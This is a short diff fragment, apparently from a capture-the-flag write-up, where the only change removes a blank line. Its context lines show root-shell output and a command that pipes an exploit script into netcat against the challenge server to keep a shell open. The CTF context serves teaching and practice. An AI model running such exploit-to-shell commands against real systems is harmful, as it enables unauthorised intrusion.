@@ -341,7 +341,6 @@ uid=0(root) gid=0(root) groups=0(root)
 
 ```
 (./exploit.py; cat) | nc nothing.chal.ctf.westerns.tokyo 10001
-
 ```
 ```
 ... lots of space
